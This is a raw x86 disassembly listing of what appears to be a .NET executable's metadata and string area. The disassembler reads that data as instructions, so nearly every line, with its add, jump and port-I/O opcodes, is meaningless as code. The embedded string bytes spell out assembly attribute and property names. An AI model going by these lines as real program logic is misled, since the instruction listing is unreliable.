  4026f3:	add    al,0x9
  4026f5:	add    BYTE PTR [ebx],dh
  4026f7:	add    BYTE PTR [ecx],al
  4026f9:	add    BYTE PTR [ecx],dl
  4026fb:	add    BYTE PTR [ebx],dh
  4026fd:	add    BYTE PTR [ecx],al
  4026ff:	add    BYTE PTR [ecx],bl
  402701:	add    BYTE PTR [ebx],dh
  402703:	add    BYTE PTR [ecx],al
  402705:	add    BYTE PTR [ecx],ah
  402707:	add    BYTE PTR [ebx],dh
  402709:	add    BYTE PTR [ecx],al
  40270b:	add    BYTE PTR [ecx],ch
  40270d:	add    BYTE PTR [ebx],dh
  40270f:	add    BYTE PTR [ecx],al
  402711:	add    BYTE PTR [ecx],dh
  402713:	add    BYTE PTR [ebx],dh
  402715:	add    BYTE PTR [ecx],al
  402717:	add    BYTE PTR [ecx],bh
  402719:	add    BYTE PTR [ebx],dh
  40271b:	add    BYTE PTR [ecx],al
  40271d:	add    BYTE PTR [ecx+0x0],al
  402720:	xor    eax,DWORD PTR [eax]
  402722:	push   es
  402723:	add    BYTE PTR [ecx+0x0],cl
  402726:	xor    eax,DWORD PTR [eax]
  402728:	add    DWORD PTR [eax],eax
  40272a:	push   ecx
  40272b:	add    BYTE PTR [ebx],dh
  40272d:	add    BYTE PTR [ecx],al
  40272f:	add    BYTE PTR [ecx+0x0],bl
  402732:	xor    eax,DWORD PTR [eax]
  402734:	or     eax,DWORD PTR [eax]
  402736:	popa   
  402737:	add    BYTE PTR [ebx],dh
  402739:	add    BYTE PTR [eax],dl
  40273b:	add    BYTE PTR [ecx+0x1401f500],cl
  402741:	add    BYTE PTR [ecx+0x19020300],cl
  402747:	add    BYTE PTR [ecx+0x1d020b00],cl
  40274d:	add    BYTE PTR [ecx+0x22022c00],dl
  402753:	add    BYTE PTR [ecx+0x28024000],ah
  402759:	add    BYTE PTR [ecx+0x2c025900],ch
  40275f:	add    BYTE PTR [ecx+0x1003300],al
  402765:	add    BYTE PTR [ecx+0x32027000],dh
  40276b:	add    BYTE PTR [ecx+0x10027b00],al
  402771:	add    BYTE PTR [ecx+0x0],bh
  402774:	add    BYTE PTR [edx],0x36
  402777:	add    BYTE PTR [ecx+0x0],bh
  40277a:	mov    es,WORD PTR [edx]
  40277c:	add    DWORD PTR [eax],eax
  40277e:	jns    0x402780
  402780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402781:	add    dh,BYTE PTR [edx]
  402783:	add    BYTE PTR [ecx+0x0],bh
  402786:	mov    ebx,0x89001902
  40278b:	add    bl,cl
  40278d:	add    bh,BYTE PTR ds:0xd2007900
  402793:	add    al,BYTE PTR [eax+eax*1-0x3f]
  402797:	add    dh,ah
  402799:	add    bl,BYTE PTR [ecx]
  40279b:	add    BYTE PTR [ecx+0x0],bh
  40279e:	out    dx,eax
  40279f:	add    bl,BYTE PTR [ecx]
  4027a1:	add    BYTE PTR [ecx+0x0],bh
  4027a4:	std    
  4027a5:	add    bl,BYTE PTR [ecx]
  4027a7:	add    BYTE PTR [ecx+0x0],bh
  4027aa:	lsl    esi,WORD PTR [edx]
  4027ad:	add    BYTE PTR [ecx+0x0],bh
  4027b0:	sub    BYTE PTR [ebx],al
  4027b2:	xor    al,BYTE PTR [eax]
  4027b4:	jns    0x4027b6
  4027b6:	cmp    DWORD PTR [ebx],eax
  4027b8:	xor    al,BYTE PTR [eax]
  4027ba:	jns    0x4027bc
  4027bc:	dec    ecx
  4027bd:	add    esi,DWORD PTR [edx]
  4027bf:	add    BYTE PTR [ecx+0x0],bh
  4027c2:	pop    edx
  4027c3:	add    esi,DWORD PTR [edx]
  4027c5:	add    BYTE PTR [ecx+0x0],bh
  4027c8:	jno    0x4027cd
  4027ca:	sbb    DWORD PTR [eax],eax
  4027cc:	jns    0x4027ce
  4027ce:	jle    0x4027d3
  4027d0:	xor    al,BYTE PTR [eax]
  4027d2:	jns    0x4027d4
  4027d4:	xchg   esi,eax
  4027d5:	add    esi,DWORD PTR [edx]
  4027d7:	add    BYTE PTR [ecx+0x0],bh
  4027da:	mov    cl,0x3
  4027dc:	xor    al,BYTE PTR [eax]
  4027de:	jns    0x4027e0
  4027e0:	enter  0x3203,0x0
  4027e4:	jns    0x4027e6
  4027e6:	loop   0x4027eb
  4027e8:	sbb    DWORD PTR [eax],eax
  4027ea:	jns    0x4027ec
  4027ec:	repz add esi,DWORD PTR [edx]
  4027ef:	add    BYTE PTR [ecx+0x0],bh
  4027f2:	add    eax,DWORD PTR [edx+esi*1]
  4027f5:	add    BYTE PTR [ecx+0x0],bh
  4027f8:	sbb    DWORD PTR [edx+esi*1],eax
  4027fb:	add    BYTE PTR [ecx+0x0],bh
  4027fe:	cmp    BYTE PTR [edx+esi*1],al
  402801:	add    cl,cl
  402803:	add    BYTE PTR [edx+0x4],dl
  402806:	dec    eax
  402807:	add    BYTE PTR [ecx+0x0],ch
  40280a:	xor    eax,DWORD PTR [eax]
  40280c:	adc    BYTE PTR [eax],al
  40280e:	rol    DWORD PTR [eax],1
  402810:	xor    eax,DWORD PTR [eax]
  402812:	dec    edi
  402813:	add    BYTE PTR [ecx+0x0],dh
  402816:	xor    eax,DWORD PTR [eax]
  402818:	adc    BYTE PTR [eax],al
  40281a:	add    BYTE PTR cs:[ebx],dh
  40281d:	add    al,cl
  40281f:	add    BYTE PTR [esi],ch
  402821:	add    BYTE PTR [ebx],cl
  402823:	add    BYTE PTR [eax+eax*1+0x13002e],dl
  40282a:	add    BYTE PTR ds:0x1b00,ch
  40282f:	add    BYTE PTR [edi+0x0],ah
  402832:	add    BYTE PTR cs:[ebx],ah
  402835:	add    BYTE PTR [edx+0x2b002e00],bh
  40283b:	add    BYTE PTR [eax+eax*1+0x53002e],dl
  402842:	sub    BYTE PTR [ecx],al
  402844:	add    BYTE PTR cs:[edx],cl
  402847:	add    BYTE PTR [ebp+0x1],bh
  40284a:	add    BYTE PTR cs:[ebx+0x0],al
  40284e:	add    BYTE PTR ds:0x4b00,ch
  402853:	add    dh,bh
  402855:	add    BYTE PTR [esi],ch
  402857:	add    BYTE PTR [ebx],bh
  402859:	add    BYTE PTR [edi+0x0],ah
  40285c:	add    BYTE PTR cs:[ebx+0x0],bl
  402860:	xor    eax,0x63002e01
  402865:	add    BYTE PTR [esi],bh
  402867:	add    DWORD PTR [ebx+0x0],eax
  40286a:	add    DWORD PTR [ecx],0x5e
  40286d:	add    BYTE PTR [ebx+0x0],al
  402870:	inc    ebx
  402871:	add    BYTE PTR [edi+0x0],ah
  402874:	popf   
  402875:	add    DWORD PTR [edi+0x1000201],esp
  40287b:	add    BYTE PTR [eax],al
  40287d:	add    ah,dh
  40287f:	add    al,0x8c
  402881:	add    BYTE PTR [eax],al
  402883:	add    dh,dh
  402885:	add    al,0x90
  402887:	add    BYTE PTR [edx],al
  402889:	add    BYTE PTR [edx],al
  40288b:	add    BYTE PTR [ebx],al
  40288d:	add    BYTE PTR [edx],al
  40288f:	add    BYTE PTR [ebx],al
  402891:	add    BYTE PTR ds:0x800400,al
  402897:	add    BYTE PTR [ecx],al
  402899:	add    BYTE PTR [eax],al
  40289b:	add    BYTE PTR [eax+eax*1],al
	...
  4028a6:	clc    
  4028a7:	add    al,0x0
  4028a9:	add    BYTE PTR [edx],al
	...
  4028b3:	add    BYTE PTR [eax],al
  4028b5:	add    BYTE PTR [ebp+0x0],dl
  4028b8:	scas   al,BYTE PTR es:[edi]
  4028b9:	add    al,0x0
  4028bb:	add    BYTE PTR [eax],al
  4028bd:	add    BYTE PTR [edx],al
  4028bf:	add    BYTE PTR [eax],cl
  4028c1:	add    BYTE PTR [eax+eax*1],al
	...
  4028cc:	mov    bh,0x4
	...
  4028da:	add    BYTE PTR [eax],al
  4028dc:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  4028e3:	gs add BYTE PTR ds:[ebx+0x79],dl
  4028e8:	jae    0x40295e
  4028ea:	gs ins DWORD PTR es:[edi],dx
  4028ec:	cs push edx
  4028ee:	gs data16 ins BYTE PTR es:[edi],dx
  4028f1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4028f6:	outs   dx,BYTE PTR ds:[esi]
  4028f7:	add    BYTE PTR [ecx+0x73],al
  4028fa:	jae    0x402961
  4028fc:	ins    DWORD PTR es:[edi],dx
  4028fd:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402901:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  402909:	imul   esp,DWORD PTR [edx+0x75],0x2e006574
  402910:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402914:	add    BYTE PTR [ecx+0x73],al
  402917:	jae    0x40297e
  402919:	ins    DWORD PTR es:[edi],dx
  40291a:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40291e:	gs jae 0x402984
  402921:	jb     0x40298c
  402923:	jo     0x402999
  402925:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  40292c:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402933:	jae    0x4029a8
  402935:	gs ins DWORD PTR es:[edi],dx
  402937:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40293b:	outs   dx,DWORD PTR ds:[esi]
  40293c:	outs   dx,BYTE PTR ds:[esi]
  40293d:	imul   sp,WORD PTR [edi+0x75],0x6172
  402943:	je     0x4029ae
  402945:	outs   dx,DWORD PTR ds:[esi]
  402946:	outs   dx,BYTE PTR ds:[esi]
  402947:	inc    ecx
  402948:	je     0x4029be
  40294a:	jb     0x4029b5
  40294c:	bound  esi,QWORD PTR [ebp+0x74]
  40294f:	add    BYTE PTR gs:[ecx+0x73],al
  402953:	jae    0x4029ba
  402955:	ins    DWORD PTR es:[edi],dx
  402956:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40295a:	outs   dx,DWORD PTR ds:[esi]
  40295b:	ins    DWORD PTR es:[edi],dx
  40295c:	jo     0x4029bf
  40295e:	outs   dx,BYTE PTR ds:[esi]
  40295f:	jns    0x4029a2
  402961:	je     0x4029d7
  402963:	jb     0x4029ce
  402965:	bound  esi,QWORD PTR [ebp+0x74]
  402968:	add    BYTE PTR gs:[ecx+0x73],al
  40296c:	jae    0x4029d3
  40296e:	ins    DWORD PTR es:[edi],dx
  40296f:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402973:	jb     0x4029e4
  402975:	fs jne 0x4029db
  402978:	je     0x4029bb
  40297a:	je     0x4029f0
  40297c:	jb     0x4029e7
  40297e:	bound  esi,QWORD PTR [ebp+0x74]
  402981:	add    BYTE PTR gs:[ecx+0x73],al
  402985:	jae    0x4029ec
  402987:	ins    DWORD PTR es:[edi],dx
  402988:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40298c:	outs   dx,DWORD PTR ds:[esi]
  40298d:	jo     0x402a08
  40298f:	jb     0x4029fa
  402991:	addr16 push 0x74744174
  402997:	jb     0x402a02
  402999:	bound  esi,QWORD PTR [ebp+0x74]
  40299c:	add    BYTE PTR gs:[ecx+0x73],al
  4029a0:	jae    0x402a07
  4029a2:	ins    DWORD PTR es:[edi],dx
  4029a3:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4029a7:	jb     0x402a0a
  4029a9:	fs gs ins DWORD PTR es:[edi],dx
  4029ac:	popa   
  4029ad:	jb     0x402a1a
  4029af:	inc    ecx
  4029b0:	je     0x402a26
  4029b2:	jb     0x402a1d
  4029b4:	bound  esi,QWORD PTR [ebp+0x74]
  4029b7:	add    BYTE PTR gs:[ebx+0x79],dl
  4029bb:	jae    0x402a31
  4029bd:	gs ins DWORD PTR es:[edi],dx
  4029bf:	cs push edx
  4029c1:	jne    0x402a31
  4029c3:	je     0x402a2e
  4029c5:	ins    DWORD PTR es:[edi],dx
  4029c6:	gs cs dec ecx
  4029c9:	outs   dx,BYTE PTR ds:[esi]
  4029ca:	je     0x402a31
  4029cc:	jb     0x402a3d
  4029ce:	jo     0x402a23
  4029d0:	gs jb  0x402a49
  4029d3:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  4029da:	ins    DWORD PTR es:[edi],dx
  4029db:	push   esi
  4029dc:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  4029e3:	je     0x402a59
  4029e5:	jb     0x402a50
  4029e7:	bound  esi,QWORD PTR [ebp+0x74]
  4029ea:	add    BYTE PTR gs:[edi+0x75],al
  4029ee:	imul   esp,DWORD PTR [ecx+eax*2+0x74],0x62697274
  4029f6:	jne    0x402a6c
  4029f8:	add    BYTE PTR gs:[ecx+0x73],al
  4029fc:	jae    0x402a63
  4029fe:	ins    DWORD PTR es:[edi],dx
  4029ff:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402a03:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  402a0b:	outs   dx,DWORD PTR ds:[esi]
  402a0c:	outs   dx,BYTE PTR ds:[esi]
  402a0d:	inc    ecx
  402a0e:	je     0x402a84
  402a10:	jb     0x402a7b
  402a12:	bound  esi,QWORD PTR [ebp+0x74]
  402a15:	add    BYTE PTR gs:[ebx+0x79],dl
  402a19:	jae    0x402a8f
  402a1b:	gs ins DWORD PTR es:[edi],dx
  402a1d:	cs push edx
  402a1f:	jne    0x402a8f
  402a21:	je     0x402a8c
  402a23:	ins    DWORD PTR es:[edi],dx
  402a24:	gs cs inc ebx
  402a27:	outs   dx,DWORD PTR ds:[esi]
  402a28:	ins    DWORD PTR es:[edi],dx
  402a29:	jo     0x402a94
  402a2b:	ins    BYTE PTR es:[edi],dx
  402a2c:	gs jb  0x402a82
  402a2f:	gs jb  0x402aa8
  402a32:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402a39:	ins    DWORD PTR es:[edi],dx
  402a3a:	jo     0x402aa5
  402a3c:	ins    BYTE PTR es:[edi],dx
  402a3d:	popa   
  402a3e:	je     0x402aa9
  402a40:	outs   dx,DWORD PTR ds:[esi]
  402a41:	outs   dx,BYTE PTR ds:[esi]
  402a42:	push   edx
  402a43:	gs ins BYTE PTR es:[edi],dx
  402a45:	popa   
  402a46:	js     0x402aa9
  402a48:	je     0x402ab3
  402a4a:	outs   dx,DWORD PTR ds:[esi]
  402a4b:	outs   dx,BYTE PTR ds:[esi]
  402a4c:	jae    0x402a8f
  402a4e:	je     0x402ac4
  402a50:	jb     0x402abb
  402a52:	bound  esi,QWORD PTR [ebp+0x74]
  402a55:	add    BYTE PTR gs:[edx+0x75],dl
  402a59:	outs   dx,BYTE PTR ds:[esi]
  402a5a:	je     0x402ac5
  402a5c:	ins    DWORD PTR es:[edi],dx
  402a5d:	gs inc ebx
  402a5f:	outs   dx,DWORD PTR ds:[esi]
  402a60:	ins    DWORD PTR es:[edi],dx
  402a61:	jo     0x402ac4
  402a63:	je     0x402ace
  402a65:	bound  ebp,QWORD PTR [ecx+0x6c]
  402a68:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  402a70:	bound  esi,QWORD PTR [ebp+0x74]
  402a73:	add    BYTE PTR gs:[ebx+0x79],dl
  402a77:	jae    0x402aed
  402a79:	gs ins DWORD PTR es:[edi],dx
  402a7b:	add    BYTE PTR [edi+0x62],cl
  402a7e:	push   0x65
  402a80:	arpl   WORD PTR [eax+eax*1+0x41],si
  402a84:	je     0x402afa
  402a86:	jb     0x402af1
  402a88:	bound  esi,QWORD PTR [ebp+0x74]
  402a8b:	add    BYTE PTR gs:[ebp+0x61],al
  402a8f:	jae    0x402af6
  402a91:	ja     0x402af4
  402a93:	jb     0x402afa
  402a95:	cs inc esp
  402a97:	jb     0x402b02
  402a99:	jbe    0x402b00
  402a9b:	jb     0x402acb
  402a9d:	inc    ebx
  402a9e:	outs   dx,DWORD PTR ds:[esi]
  402a9f:	jb     0x402b06
  402aa1:	cs inc esp
  402aa3:	outs   dx,DWORD PTR ds:[esi]
  402aa4:	ins    DWORD PTR es:[edi],dx
  402aa5:	popa   
  402aa6:	imul   ebp,DWORD PTR [esi+0x0],0x74746553
  402aad:	imul   ebp,DWORD PTR [esi+0x67],0x79530073
  402ab4:	jae    0x402b2a
  402ab6:	gs ins DWORD PTR es:[edi],dx
  402ab8:	cs dec ecx
  402aba:	dec    edi
  402abb:	add    BYTE PTR [ecx+ebp*2+0x72],al
  402abf:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  402ac4:	jns    0x402b0f
  402ac6:	outs   dx,BYTE PTR ds:[esi]
  402ac7:	outs   dx,WORD PTR ds:[esi]
  402ac9:	add    BYTE PTR [ebx+0x74],dl
  402acc:	jb     0x402b37
  402ace:	outs   dx,BYTE PTR ds:[esi]
  402acf:	add    BYTE PTR [bx+di+0x73],cl
  402ad3:	dec    esi
  402ad4:	jne    0x402b42
  402ad6:	ins    BYTE PTR es:[edi],dx
  402ad7:	dec    edi
  402ad8:	jb     0x402b1f
  402ada:	ins    DWORD PTR es:[edi],dx
  402adb:	jo     0x402b51
  402add:	jns    0x402adf
  402adf:	push   esp
  402ae0:	outs   dx,DWORD PTR ds:[esi]
  402ae1:	dec    esp
  402ae2:	outs   dx,DWORD PTR ds:[esi]
  402ae3:	ja     0x402b4a
  402ae5:	jb     0x402ae7
  402ae7:	inc    ebp
  402ae8:	jno    0x402b5f
  402aea:	popa   
  402aeb:	ins    BYTE PTR es:[edi],dx
  402aec:	jae    0x402aee
  402aee:	inc    ebp
  402aef:	outs   dx,BYTE PTR ds:[esi]
  402af0:	jbe    0x402b5b
  402af2:	jb     0x402b63
  402af4:	outs   dx,BYTE PTR ds:[esi]
  402af5:	ins    DWORD PTR es:[edi],dx
  402af6:	outs   dx,BYTE PTR gs:[esi]
  402af8:	je     0x402afa
  402afa:	push   ebx
  402afb:	jo     0x402b62
  402afd:	arpl   WORD PTR [ecx+0x61],bp
  402b00:	ins    BYTE PTR es:[edi],dx
  402b01:	inc    esi
  402b02:	outs   dx,DWORD PTR ds:[esi]
  402b03:	ins    BYTE PTR es:[edi],dx
  402b04:	fs gs jb 0x402b08
  402b08:	inc    edi
  402b09:	gs je  0x402b52
  402b0c:	outs   dx,DWORD PTR ds:[esi]
  402b0d:	ins    BYTE PTR es:[edi],dx
  402b0e:	fs gs jb 0x402b62
  402b12:	popa   
  402b13:	je     0x402b7d
  402b15:	add    BYTE PTR [ecx+0x62],al
  402b18:	outs   dx,DWORD PTR ds:[esi]
  402b19:	jne    0x402b8f
  402b1b:	add    BYTE PTR [edi+0x65],ah
  402b1e:	je     0x402b7f
  402b20:	inc    ecx
  402b21:	jae    0x402b96
  402b23:	gs ins DWORD PTR es:[edi],dx
  402b25:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402b29:	outs   dx,DWORD PTR ds:[esi]
  402b2a:	ins    DWORD PTR es:[edi],dx
  402b2b:	jo     0x402b8e
  402b2d:	outs   dx,BYTE PTR ds:[esi]
  402b2e:	jns    0x402b30
  402b30:	push   eax
  402b31:	popa   
  402b32:	je     0x402b9c
  402b34:	add    BYTE PTR [ebx+0x6f],al
  402b37:	ins    DWORD PTR es:[edi],dx
  402b38:	bound  ebp,QWORD PTR [ecx+0x6e]
  402b3b:	add    BYTE PTR gs:[esi+0x69],al
  402b3f:	ins    BYTE PTR es:[edi],dx
  402b40:	gs push ebx
  402b42:	jns    0x402bb7
  402b44:	je     0x402bab
  402b46:	ins    DWORD PTR es:[edi],dx
  402b47:	dec    ecx
  402b48:	outs   dx,BYTE PTR ds:[esi]
  402b49:	outs   dx,WORD PTR ds:[esi]
  402b4b:	add    BYTE PTR [edi+0x65],ah
  402b4e:	je     0x402baf
  402b50:	inc    ebp
  402b51:	js     0x402bbc
  402b53:	jae    0x402bc9
  402b55:	jae    0x402b57
  402b57:	inc    ebx
  402b58:	jb     0x402bbf
  402b5a:	popa   
  402b5b:	je     0x402bc2
  402b5d:	add    BYTE PTR [edi+0x65],al
  402b60:	je     0x402bab
  402b62:	outs   dx,BYTE PTR ds:[esi]
  402b63:	jae    0x402bd9
  402b65:	popa   
  402b66:	outs   dx,BYTE PTR ds:[esi]
  402b67:	arpl   WORD PTR [ebp+0x0],sp
  402b6a:	jae    0x402bd1
  402b6c:	je     0x402bcd
  402b6e:	dec    esp
  402b6f:	popa   
  402b70:	outs   dx,BYTE PTR ds:[esi]
  402b71:	addr16 jne 0x402bd5
  402b74:	add    BYTE PTR gs:[bx+di+0x4f],cl
  402b79:	inc    ebp
  402b7a:	js     0x402bdf
  402b7c:	gs jo  0x402bf3
  402b7f:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  402b86:	pop    edi
  402b87:	push   ebp
  402b88:	jae    0x402bef
  402b8a:	inc    esp
  402b8b:	gs popaw 
  402b8e:	jne    0x402bfc
  402b90:	je     0x402be2
  402b92:	jb     0x402c03
  402b94:	js     0x402c0f
  402b96:	add    BYTE PTR [edi+0x65],ah
  402b99:	je     0x402bfa
  402b9b:	push   eax
  402b9c:	jb     0x402c0d
  402b9e:	js     0x402c19
  402ba0:	push   ebx
  402ba1:	gs jb  0x402c1a
  402ba4:	gs jb  0x402ba7
  402ba7:	inc    ebx
  402ba8:	outs   dx,DWORD PTR ds:[esi]
  402ba9:	outs   dx,BYTE PTR ds:[esi]
  402baa:	arpl   WORD PTR [ecx+0x74],sp
  402bad:	add    BYTE PTR [edi+0x65],ah
  402bb0:	je     0x402c11
  402bb2:	push   eax
  402bb3:	jb     0x402c24
  402bb5:	js     0x402c30
  402bb7:	push   eax
  402bb8:	outs   dx,DWORD PTR ds:[esi]
  402bb9:	jb     0x402c2f
  402bbb:	add    BYTE PTR [ecx+0x6e],cl
  402bbe:	je     0x402bf3
  402bc0:	xor    al,BYTE PTR [eax]
  402bc2:	push   esp
  402bc3:	outs   dx,DWORD PTR ds:[esi]
  402bc4:	push   ebx
  402bc5:	je     0x402c39
  402bc7:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  402bce:	pop    edi
  402bcf:	push   eax
  402bd0:	jb     0x402c41
  402bd2:	js     0x402c4d
  402bd4:	push   ebp
  402bd5:	jae    0x402c3c
  402bd7:	jb     0x402bd9
  402bd9:	addr16 gs je 0x402c3c
  402bdd:	push   eax
  402bde:	jb     0x402c4f
  402be0:	js     0x402c5b
  402be2:	push   eax
  402be3:	popa   
  402be4:	jae    0x402c59
  402be6:	ja     0x402c57
  402be8:	jb     0x402c4e
  402bea:	add    BYTE PTR [edi+0x65],ah
  402bed:	je     0x402c4e
  402bef:	inc    ecx
  402bf0:	jne    0x402c66
  402bf2:	outs   dx,DWORD PTR ds:[esi]
  402bf3:	inc    ebx
  402bf4:	jb     0x402c5b
  402bf6:	popa   
  402bf7:	je     0x402c5e
  402bf9:	push   ebx
  402bfa:	je     0x402c6b
  402bfc:	jb     0x402c63
  402bfe:	push   eax
  402bff:	outs   dx,DWORD PTR ds:[esi]
  402c00:	imul   ebp,DWORD PTR [esi+0x74],0x74656700
  402c07:	pop    edi
  402c08:	inc    ebx
  402c09:	ins    BYTE PTR es:[edi],dx
  402c0a:	outs   dx,DWORD PTR ds:[esi]
  402c0b:	jae    0x402c72
  402c0d:	inc    ebx
  402c0e:	outs   dx,DWORD PTR ds:[esi]
  402c0f:	outs   dx,BYTE PTR ds:[esi]
  402c10:	imul   si,WORD PTR [edx+0x6d],0x6700
  402c16:	gs je  0x402c78
  402c19:	inc    ebx
  402c1a:	ins    BYTE PTR es:[edi],dx
  402c1b:	outs   dx,DWORD PTR ds:[esi]
  402c1c:	jae    0x402c83
  402c1e:	push   esp
  402c1f:	outs   dx,DWORD PTR ds:[esi]
  402c20:	push   esp
  402c21:	jb     0x402c84
  402c23:	jns    0x402c25
  402c25:	addr16 gs je 0x402c88
  402c29:	push   ebx
  402c2a:	arpl   WORD PTR [eax+0x65],bp
  402c2d:	fs jne 0x402c9c
  402c30:	gs push ebx
  402c32:	arpl   WORD PTR [ecx+0x6e],sp
  402c35:	add    BYTE PTR [edi+0x65],ah
  402c38:	je     0x402c99
  402c3a:	push   ebp
  402c3b:	jo     0x402ca9
  402c3d:	outs   dx,DWORD PTR ds:[esi]
  402c3e:	popa   
  402c3f:	fs dec eax
  402c41:	popa   
  402c42:	jb     0x402ca8
  402c44:	ja     0x402ca7
  402c46:	jb     0x402cad
  402c48:	dec    ecx
  402c49:	outs   dx,BYTE PTR ds:[esi]
  402c4a:	outs   dx,WORD PTR ds:[esi]
  402c4c:	add    BYTE PTR [edi+0x65],ah
  402c4f:	je     0x402cb0
  402c51:	dec    esp
  402c52:	popa   
  402c53:	outs   dx,BYTE PTR ds:[esi]
  402c54:	addr16 jne 0x402cb8
  402c57:	add    BYTE PTR gs:[bx+0x65],ah
  402c5c:	je     0x402cbd
  402c5e:	push   ebx
  402c5f:	push   0x6552776f
  402c64:	jae    0x402cda
  402c66:	outs   dx,DWORD PTR ds:[esi]
  402c67:	jb     0x402cce
  402c69:	dec    esi
  402c6a:	gs js  0x402ce1
  402c6d:	push   esp
  402c6e:	imul   ebp,DWORD PTR [ebp+0x65],0x74656700
  402c75:	pop    edi
  402c76:	dec    ecx
  402c77:	jae    0x402cba
  402c79:	jne    0x402cef
  402c7b:	outs   dx,DWORD PTR ds:[esi]
  402c7c:	push   ebx
  402c7d:	arpl   WORD PTR [ecx+0x6e],sp
  402c80:	push   edi
  402c81:	push   0x614c6e65
  402c86:	jne    0x402cf6
  402c88:	arpl   WORD PTR [eax+0x65],bp
  402c8b:	add    BYTE PTR fs:[edi+0x65],ah
  402c8f:	je     0x402cf0
  402c91:	dec    ecx
  402c92:	jae    0x402cd5
  402c94:	jne    0x402d0a
  402c96:	outs   dx,DWORD PTR ds:[esi]
  402c97:	push   edx
  402c98:	jne    0x402d08
  402c9a:	push   edi
  402c9b:	push   0x74536e65
  402ca0:	popa   
  402ca1:	jb     0x402d17
  402ca3:	add    BYTE PTR [edi+0x65],ah
  402ca6:	je     0x402d07
  402ca8:	dec    ecx
  402ca9:	jae    0x402ced
  402cab:	popa   
  402cac:	arpl   WORD PTR [ebx+0x75],bp
  402caf:	jo     0x402cf2
  402cb1:	jne    0x402d27
  402cb3:	outs   dx,DWORD PTR ds:[esi]
  402cb4:	push   ebx
  402cb5:	gs ins BYTE PTR es:[edi],dx
  402cb7:	arpl   WORD PTR gs:[ecx+eax*2+0x6c],si
  402cbc:	ins    BYTE PTR es:[edi],dx
  402cbd:	add    BYTE PTR [edi+0x65],ah
  402cc0:	je     0x402d21
  402cc2:	inc    edx
  402cc3:	popa   
  402cc4:	arpl   WORD PTR [ebx+0x75],bp
  402cc7:	jo     0x402d1d
  402cc9:	outs   dx,DWORD PTR ds:[esi]
  402cca:	push   eax
  402ccb:	popa   
  402ccc:	je     0x402d36
  402cce:	add    BYTE PTR [edi+0x65],ah
  402cd1:	je     0x402d32
  402cd3:	dec    ecx
  402cd4:	jae    0x402d26
  402cd6:	ins    BYTE PTR es:[edi],dx
  402cd7:	popa   
  402cd8:	jns    0x402d2d
  402cda:	outs   dx,DWORD PTR ds:[esi]
  402cdb:	jne    0x402d4b
  402cdd:	add    BYTE PTR fs:[edi+0x65],ah
  402ce1:	je     0x402d42
  402ce3:	push   ebx
  402ce4:	push   0x6853776f
  402ce9:	popa   
  402cea:	jb     0x402d51
  402cec:	dec    esi
  402ced:	gs js  0x402d64
  402cf0:	push   esp
  402cf1:	imul   ebp,DWORD PTR [ebp+0x65],0x74656700
  402cf8:	pop    edi
  402cf9:	inc    edi
  402cfa:	gs je  0x402d41
  402cfd:	jb     0x402d68
  402cff:	jbe    0x402d66
  402d01:	jb     0x402d49
  402d03:	jb     0x402d74
  402d05:	ins    DWORD PTR es:[edi],dx
  402d06:	push   edi
  402d07:	imul   ebp,DWORD PTR [esi+0x64],0x5573776f
  402d0e:	jo     0x402d74
  402d10:	popa   
  402d11:	je     0x402d78
  402d13:	add    BYTE PTR [edi+0x65],ah
  402d16:	je     0x402d77
  402d18:	dec    ecx
  402d19:	jae    0x402d61
  402d1b:	imul   esi,DWORD PTR [edx+0x73],0x696c4374
  402d22:	arpl   WORD PTR [ebx+0x47],bp
  402d25:	imul   esp,DWORD PTR [esi+0x74],0x6c694600
  402d2c:	add    BYTE PTR gs:[edi+0x72],dl
  402d30:	imul   esi,DWORD PTR [ebp+eiz*2+0x41],0x694c6c6c
  402d38:	outs   dx,BYTE PTR ds:[esi]
  402d39:	gs jae 0x402d3c
  402d3c:	inc    ecx
  402d3d:	je     0x402db3
  402d3f:	jb     0x402daa
  402d41:	bound  esi,QWORD PTR [ebp+0x74]
  402d44:	gs push ebp
  402d46:	jae    0x402da9
  402d48:	addr16 gs inc ecx
  402d4b:	je     0x402dc1
  402d4d:	jb     0x402db8
  402d4f:	bound  esi,QWORD PTR [ebp+0x74]
  402d52:	add    BYTE PTR gs:[ecx+0x74],al
  402d56:	je     0x402dca
  402d58:	imul   esp,DWORD PTR [edx+0x75],0x61546574
  402d5f:	jb     0x402dc8
  402d61:	gs je  0x402dd7
  402d64:	add    BYTE PTR [ebp+0x61],al
  402d67:	jae    0x402dce
  402d69:	ja     0x402dcc
  402d6b:	jb     0x402dd2
  402d6d:	cs inc ebx
  402d6f:	outs   dx,DWORD PTR ds:[esi]
  402d70:	outs   dx,BYTE PTR ds:[esi]
  402d71:	imul   sp,WORD PTR [edi+0x4c],0x6e61
  402d77:	addr16 jne 0x402ddb
  402d7a:	addr16 gs inc esi
  402d7d:	jb     0x402dee
  402d7f:	ins    DWORD PTR es:[edi],dx
  402d80:	push   ebx
  402d81:	gs je  0x402df9
  402d84:	jo     0x402db4
  402d86:	gs js  0x402dee
  402d89:	add    BYTE PTR [ebp+0x73],ch
  402d8c:	arpl   WORD PTR [edi+0x72],bp
  402d8f:	ins    BYTE PTR es:[edi],dx
  402d90:	imul   esp,DWORD PTR [edx+0x0],0x65736145
  402d97:	ja     0x402dfa
